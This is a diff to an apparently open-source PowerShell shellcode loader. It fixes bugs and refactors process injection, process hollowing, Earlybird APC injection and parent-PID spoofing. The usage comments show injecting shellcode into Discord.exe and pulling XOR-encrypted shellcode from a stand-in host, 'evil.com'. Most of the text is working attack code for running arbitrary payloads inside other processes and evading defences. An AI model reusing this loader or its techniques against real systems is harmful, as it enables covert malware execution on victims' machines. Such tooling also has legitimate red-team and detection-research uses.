@@ -1,7 +1,7 @@
-﻿function Load-Shellcode {
+function Load-Shellcode {
 #.SYNOPSIS
 # Monolithic PowerShell Wrapper for Standalone Shellcode Injection Techniques
-# Arbitary Version Number: v0.9.9
+# Arbitary Version Number: v0.9.9-beta
 # Author: Tyler McCann (@tylerdotrar)
 #
 #.DESCRIPTION
@@ -41,18 +41,18 @@
 #   -ParentPID      -->  PID of parent process to attempt to spoof.   (-Hollow/-Earlybird)
 #
 # Example Usage:
-#  _______________________________________________________________________________________________________
-# |                                                                                                       |
-# | # Remote inject shellcode file into 'Discord.exe'                                                     |
-# | PS> $DiscordPID = (Get-Process -Name Discord).Id | Select -First 1                                    |
-# | PS> Load-Shellcode -LocalInject -Shellcode .\calc64.bin -TargetPID $DiscordPID                        |
-# |                                                                                                       |
-# | # Process hollow 'runtimebroker.exe' with spoofed process arguments                                   |
-# | PS> Process-Hollow -Shellcode ./msgbox64.bin -CreateProcess 'runtimebroker' -ProcessArgs '-Embedding' |
-# |                                                                                                       |
-# | # Earlybird inject 'calc.exe' with XOR encrypted shellcode downloaded from a URI                      |
-# | PS> Earlybird-Inject -Shellcode 'https://evil.com/bin' -XorKey 0x69 -CreateProcess 'calc'             |
-# |_______________________________________________________________________________________________________|
+#  _______________________________________________________________________________________________________________
+# |                                                                                                               |
+# | # Remote inject shellcode file into 'Discord.exe'                                                             |
+# | PS> $DiscordPID = (Get-Process -Name Discord).Id | Select -First 1                                            |
+# | PS> Load-Shellcode -LocalInject -Shellcode .\calc64.bin -TargetPID $DiscordPID                                |
+# |                                                                                                               |
+# | # Process hollow 'runtimebroker.exe' with spoofed process arguments                                           |
+# | PS> Load-Shellcode -Hollow -Shellcode ./msgbox64.bin -CreateProcess 'runtimebroker' -ProcessArgs '-Embedding' |
+# |                                                                                                               |
+# | # Earlybird inject 'calc.exe' with XOR encrypted shellcode downloaded from a URI                              |
+# | PS> Load-Shellcode -Earlybird -Shellcode 'https://evil.com/bin' -XorKey 0x69 -CreateProcess 'calc'            |
+# |_______________________________________________________________________________________________________________|
 #
 #.LINK
 # https://github.com/tylerdotrar/ShellcodeLoaderPS
@@ -103,7 +103,7 @@
     if ($ProcessHollow -or $APCInject) {
         if (!$CreateProcess) { return (Write-Host '[!] Error! Missing target process to execute.' -ForegroundColor Red) }
         if (!(Get-Item -LiteralPath $CreateProcess 2>$NULL).FullName -and !(Get-Command -Name $CreateProcess 2>$NULL).Path) {
-            return (Write-Host "[!] Error! Unable to locate process '${ProcessName}'." -ForegroundColor Red)
+            return (Write-Host "[!] Error! Unable to locate process '${CreateProcess}'." -ForegroundColor Red)
         }
         if ($ParentProcess -or $ParentPID) { $PPIDspoof = $TRUE }
     }
@@ -604,12 +604,10 @@
             $lpProcessAttributes  = [ref]$ProcessAttributes                   # Pointer to a SECURITY_ATTRIBUTES struct (for the process).
             $lpThreadAttributes   = [ref]$ThreadAttributes                    # Pointer to a SECURITY_ATTRIBUTES struct (for the thread).
             $bInheritHandles      = $False                                    # Boolean for new process to inherit handles from calling process.  
-            #$dwCreationFlags      = $ProcessCreation.CREATE_SUSPENDED           # New process creation flags (i.e., create in suspended state).
             $dwCreationFlags      = $ProcessCreation.EXTENDED_STARTUPINFO_PRESENT -bor $ProcessCreation.CREATE_SUSPENDED     # New process creation flags.
             $lpEnvironment        = [IntPtr]::Zero                            # Pointer to the environment block for the new process.
             $lpCurrentDirectory   = $(Split-Path -LiteralPath $CreateProcess) # Full path to the current directory for the process.
-            #$lpStartupInfo        = [ref]$StartupInfo                         # Pointer to STARTUPINFOA struct.
-            $lpStartupInfo        = [ref]$StartupInfoEx                         # Pointer to STARTUPINFOA struct.
+            $lpStartupInfo        = [ref]$StartupInfoEx                       # Pointer to STARTUPINFOEXA struct.
             $lpProcessInformation = [ref]$ProcessInformation                  # Pointer to PROCESS_INFORMATION struct.
 
             Write-Host ' o  ' -NoNewline ; Write-Host 'CreateProcessA()' -ForegroundColor Green
@@ -622,7 +620,7 @@
             Write-Host " o  --> Process Path : ${CreateProcess}"
             Write-Host " o  --> Process PID  : $($RetProcessInformation.dwProcessId)"
         }
-        else { $RetProcessInformation = $ProcessInformation.Value }
+        else { $RetProcessInformation = $SuspendedProcess }
 
     
         ### (2) Parse the Process Enviroment Block (PEB) of the Suspended Process ###
@@ -811,11 +809,7 @@
             Write-Host " o  --> Process Path : ${CreateProcess}"
             Write-Host " o  --> Process PID  : $($RetProcessInformation.dwProcessId)"
         }
-        else {
-            Write-Host '[x] Skipping process creation.' -ForegroundColor Yellow
-            Write-Host $ProcessInformation -ForegroundColor Magenta
-            $RetProcessInformation = $ProcessInformation
-        }
+        else { $RetProcessInformation = $SuspendedProcess }
 
 
         ### (2) Allocate memory within Target Process ###
@@ -1048,8 +1042,8 @@
         $Attribute = $ProcAttrFlags.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
         $lpValue   = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
         #Troubleshooting
-        Write-Host "[x] Attribute value  : ${attribute}"
-        Write-Host "[x] lpValue value    : ${lpValue}"
+        #Write-Host "[x] Attribute value  : ${attribute}"
+        #Write-Host "[x] lpValue value    : ${lpValue}"
 
         [System.Runtime.InteropServices.Marshal]::WriteInt64($lpValue, $ProcAttrFlags.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)
 
@@ -1069,6 +1063,15 @@
         #  > Description : Create a new process and its primary thread.
         #  > Location    : Kernel32.dll
         #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
+
+        # DEBUG
+        Write-Host '[x] Debug:' -ForegroundColor Cyan
+        Write-Host " o CreateProcess = $CreateProcess"
+        Write-Host " o CommandLine   = ${CreateProcess} ${ProcessArgs}"
+        Write-Host " o ProcAttribs   = $([ref]$ProcessAttributes)"
+        Write-Host " o ThreadAttribs = $([ref]$ThreadAttributes)"
+        Write-Host " o CreationFlags = $($ProcessCreation.EXTENDED_STARTUPINFO_PRESENT -bor $ProcessCreation.CREATE_SUSPENDED)"
+        Write-Host '[x] End' -ForegroundColor Cyan
 
         # Argument(s)
         $lpApplicationName    = $CreateProcess                                                                        # Full path of the application to be executed.
@@ -1116,7 +1119,7 @@
     }
     # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
     $ProcessCreation = @{
-        CREATE_SUSPENDED             = 0x00000004; # used
+        CREATE_SUSPENDED             = 0x00000004;
         CREATE_SECURE_PROCESS        = 0x00400000;
         CREATE_NO_WINDOW             = 0x08000000;
         CREATE_NEW_CONSOLE           = 0x00000010;
@@ -1228,9 +1231,6 @@
     Write-Host '[!] Loading Win32 API Calls...' -ForegroundColor Yellow
 
     Try {
-        <#
-        if ($PPIDspoof) { $StartupInfoRef = $StartupInfoExTypeRef }
-        else            { $StartupInfoRef = $StartupInfoTypeRef }
 
         $CreateProcArgs = @(
             [String],                   #lpApplicationName
@@ -1241,23 +1241,7 @@
             [Int32],                    #dwCreationFlags
             [IntPtr],                   #lpEnvironment
             [String],                   #lpCurrentDirectory
-            $StartupInfoTypeRef,        #lpStartupInfo
-            $ProcessInformationTypeRef  #lpProcessInformation
-        )
-        $CreateProcessA = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateProcessA" -ParamTypes $CreateProcArgs -ReturnType ([Bool])
-        #>
-
-        # Testing
-        $CreateProcArgs = @(
-            [String],                   #lpApplicationName
-            [String],                   #lpCommandLine
-            $SecurityAttributesTypeRef, #lpProcessAttributes
-            $SecurityAttributesTypeRef, #lpThreadAttributes
-            [Bool],                     #bInheritHandles
-            [Int32],                    #dwCreationFlags
-            [IntPtr],                   #lpEnvironment
-            [String],                   #lpCurrentDirectory
-            $StartupInfoExTypeRef,      #lpStartupInfo
+            $StartupInfoExTypeRef,      #lpStartupInfo PLEASE
             $ProcessInformationTypeRef  #lpProcessInformation
         )
         $CreateProcessA = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateProcessA" -ParamTypes $CreateProcArgs -ReturnType ([Bool])
@@ -1396,7 +1380,7 @@
     if ($RemoteInject) { $TargetProcess = Get-Process -Id $TargetPID }
 
     # Validate Target Process
-    if ($ProcHollow -or $APCInject) {
+    if ($ProcessHollow -or $APCInject) {
         if (Test-Path -LiteralPath $CreateProcess 2>$NULL) { $CreateProcess = (Get-Item -LiteralPath $CreateProcess).FullName }
         else                                               { $CreateProcess = (Get-Command -Name $CreateProcess).Path         }
     }
@@ -1426,30 +1410,12 @@
 
     ### MAIN ###
 
-    # Note: need to change CreateProcessA() to utilize STARTUPINFOEXA by default.
+    if ($LocalInject)      { Local-ProcessInject  }
+    elseif ($RemoteInject) { Remote-ProcessInject }
 
-    if ($LocalInject) {
-        Write-Host "[!] Performing Local Process Injection (Threadless)" -ForegroundColor Green
-        Local-ProcessInject
-    }
-    elseif ($RemoteInject) {
-        Write-Host "[!] Performing Remote Process Injection" -ForegroundColor Green
-        Remote-ProcessInject
-    }
+    elseif ($PPIDspoof) { $SpoofedInfo = PPID-Spoof }
 
-    elseif ($ProcessHollow) {
-        Write-Host "[!] Performing Process Hollowing" -ForegroundColor Green
+    if ($ProcessHollow) { Process-Hollow -SuspendedProcess $SpoofedInfo   }
+    elseif ($APCInject) { Earlybird-Inject -SuspendedProcess $SpoofedInfo }
 
-        if ($PPIDspoof) { 
-          $SpoofedInfo = PPID-Spoof
-        }
-        Process-Hollow -SuspendedProcess $SpoofedInfo
-    }
-
-    elseif ($APCInject) {
-        Write-Host "[!] Performing Earlybird APC Queue Injection" -ForegroundColor Green
-
-        if ($PPIDspoof) { $SpoofedInfo = PPID-Spoof }
-        Earlybird-Inject -SuspendedProcess $SpoofedInfo
-    }
 }
